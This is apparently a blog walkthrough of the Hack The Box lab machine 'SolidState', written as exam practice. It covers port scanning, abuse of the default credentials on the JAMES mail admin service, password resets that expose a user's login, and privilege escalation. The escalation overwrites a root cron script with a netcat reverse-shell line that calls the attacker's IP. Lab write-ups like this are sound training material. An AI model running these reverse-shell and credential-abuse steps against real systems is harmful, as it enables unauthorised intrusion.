---
title: 'HTB-SolidState'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:06 16-03-2025**

---
```
Scope:
10.10.10.51
```
# Recon

## Nmap

```bash
sudo nmap solid -p- -sC -sV -sT -T5 -vvvv --min-rate 5000 --reason

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        syn-ack JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solid (10.10.16.3 [10.10.16.3])
80/tcp   open  http        syn-ack Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp  open  pop3        syn-ack JAMES pop3d 2.3.2
119/tcp  open  nntp        syn-ack JAMES nntpd (posting ok)
4555/tcp open  james-admin syn-ack JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also tried `161` UDP for good measure:

```bash
sudo nmap solid -p161 -sC -sV -sU -T5 -vvvv --min-rate 5000 --reason

Host is up, received echo-reply ttl 63 (0.086s latency).
Scanned at 2025-03-16 08:09:29 CET for 1s

PORT    STATE  SERVICE REASON              VERSION
161/udp closed snmp    port-unreach ttl 63
```

Right away I notice the **JAMES Remote Admin 2.3.2** service which I look up:

![](attachments/cd2ed9c23fe48b6f96e9d6ec9c89d344.png)

Good to know! Let's enumerate the rest first.

## 25/TCP - SMTP

![](attachments/c8c0656e20de7f729e77d645b0f24b7c.png)

Relay attack isn't possible.

![](attachments/21d2ed18c083c71211c097c709f2a193.png)

After some minutes of scanning I didn't find any names, moving on.

## 80/TCP - HTTP

![](attachments/5d7bd19fdc3feafb1cc75f415e177d34.png)

This was about the most useful I could find in a quick skim. Let's run `feroxbuster` and enumerate the web server.

![](attachments/4fc90b66649e056def000402140e42a8.png)

![](attachments/224c7ae6d4e6809ff9e740737fbf5e20.png)

Just some static assets, moving on.

## 110/TCP - POP3

We don't have any user info so we can't do anything here *yet*.

## 119/TCP - NNTP

Unknown what this port does atm, but I think it's linked to the next port.

## 4555/TCP - James-Admin

The PoC we previously found in [[#Nmap]] gave us some interesting info:

![](attachments/8e64067dc641f62ec75369613f1be240.png)

It appears the default creds are `root:root`, let's try it out:

![](attachments/338d251d75c2633e0376c0bf143246fd.png)

Well it appears someone didn't change the default creds, good for us.

![](attachments/090d0be2b814258262f700f3f80e906b.png)

I went ahead and added these to a user list, in case I want to spray later on:

![](attachments/120474d0457f79823187d1bbb42fafa2.png)

It seemed to be sort of a dead end though:

![](attachments/8245a6d2069885fff75f0e156223b5e1.png)

Let's instead download over the PoC and run that in order to get RCE.

### PoC

Unfortunately it wouldn't fire:

![](attachments/c96a8bb3476a26892baca8292b55cf1a.png)

However when we check the service via `nc` we now see the following:

![](attachments/f31bdd28c298540ecc6b378628c0efe6.png)

This means the exploit tried to add a new user.

>[!note]
>I also tried the older version but that didnt work either for RCE.

What we can do instead is just change passwords of the users since we're an admin account.

![](attachments/1936d218e25bb1fc1aacf7136c8bf63e.png)

![](attachments/0fef200fbfd78332c223e4f8c10edfca.png)

![](attachments/c96618fb3afc3d3b06da81ee76bd7bd5.png)

Awesome, we were able to find the creds.

```
mindy
P@55W0rd1!2@
```

# Foothold

Upon login we notice that the previously set up exploit now fires:

![](attachments/ac8dd241ecb3c975a249c201eee6c69f.png)

Not to worry, couple of `enter` further we are down to the normal SSH shell.


## user.txt

![](attachments/4b5a8c77d652a8f535f985c1b747f796.png)

Due to the presence of the `.rhosts` file it appears that the server is running `r-services`, however we can't view the file since it is owned by *root*.

## Enumeration

I tried to enumerate the system but it wouldn't give:

![](attachments/b2020d7500c48a5bfdd6d208c44b2558.png)

Let's try another approach, since we're in this jail I remembered that just now the script would indeed launch upon making the `ssh` connection. Meaning that the reverse shell HIGHLY LIKELY will execute if we retry it with a listener.

![](attachments/9b33dfae73f65f0a57eb5e8c0d42fcc6.png)

![](attachments/c5b7b0d477d08a93ccd6f86c553776e9.png)

![](attachments/ad0728186e7a32ffa3145a054293988c.png)

Just as imagined, we indeed receive a reverse shell, let's see if we can do some more commands with this one.

![](attachments/79281c4d0f78cc9ffa0da83fa153ab9c.png)

It appears that this shell is way more interactive, let's continue our approach.

I downloaded over `pspy32`:

![](attachments/1c757c927649a2f2f5da156687ed0cf0.png)

![](attachments/74a700bd0c0212995a6ee6e334fcbedd.png)

I let it run for a bit and checked back.

After a few minutes I noticed that *root* had a script running:

![](attachments/9327afd3ac79b854707d6efdff91429d.png)

![](attachments/681955e091c2e3a70023c1ec315612ff.png)

I bet we can change this up in order to get ourselves a root shell.

![](attachments/3aa901afdf46c7ead1b94aea2699f46d.png)

Sure can! Let's go ahead and change it up.

# Privilege Escalation

```bash
echo "
#!/usr/bin/env python
import os
import sys
os.system('/bin/nc -e /bin/bash 10.10.16.3 81')
" > /opt/tmp.py
```

After a few minutes of waiting:

![](attachments/1bf9960f9ea0b506bbb795ca83336357.png)

Hell yeah.

## root.txt

![](attachments/162609650dbffb2e581c33099260242a.png)


![](attachments/fefff3c4abb9e78fdeff03f92d34ca61.png)

---

**Finished 09:39 16-03-2025**

[^Links]: [[Hack The Box]] [[OSCP Prep]]

#pop3 #james-admin #pspy 
